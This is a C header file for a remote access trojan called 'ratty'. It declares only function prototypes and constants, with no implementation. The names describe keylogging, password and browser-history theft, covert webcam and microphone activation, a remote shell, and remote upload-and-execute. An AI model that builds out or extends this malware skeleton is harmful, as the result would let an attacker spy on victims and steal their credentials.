#ifndef _RATTY_H_
#define _RATTY_H_

#include <arpa/inet.h>
#include <netdb.h>
#include <netinet/in.h>
#include <signal.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/socket.h>
#include <sys/time.h>
#include <sys/types.h>
#include <sys/wait.h>
#include <time.h>
#include <unistd.h>

#define PORT 8888
#define SERVER_CMD_SIZE 128
#define SYSINFO_CMD_SIZE 512

/* Colors */

#define DEF_CLR "\033[0m"
#define BLK_CLR "\033[0;30m"
#define RED_CLR "\033[0;31m"
#define GRN_CLR "\033[0;32m"
#define YLW_CLR "\033[0;33m"
#define BLU_CLR "\033[0;34m"
#define MGN_CLR "\033[0;35m"
#define CYA_CLR "\033[0;36m"
#define WHT_CLR "\033[0;37m"

/* Routines */

int client_routine(int sock);
int server_routine(int sock);

/* Rat functionality */

int grab_system_info(int sock);

int show_file_manager(int sock);
int show_registry_editor(int sock);
int show_process_manager(int sock);

int show_remote_desktop(int sock);
int show_screenshot(int sock);
int enable_microphone(int sock);
int enable_webcam(int sock);

int enable_keylogger(int sock);
int grab_passwords(int sock);
int grab_history(int sock);

int show_remote_shell(int sock);
int upload_and_execute(int sock);
int power_control(int sock);

int show_remote_chat(int sock);

/* Print functions */

void print_main_menu(void);
void print_managers_menu(void);
void print_spying_menu(void);
void print_datacoll_menu(void);
void print_tools_menu(void);
void print_other_menu(void);

/* Auxiliary stuff */

void _chkbytes(char *str, int bytes);
void _clrscr(void);
void _dumperr(char *str);
void _flush(void);
void _killproc(void);
int _readfile(const char *filename, char *buf);
int _writefile(const char *filename, char *buf);

#endif
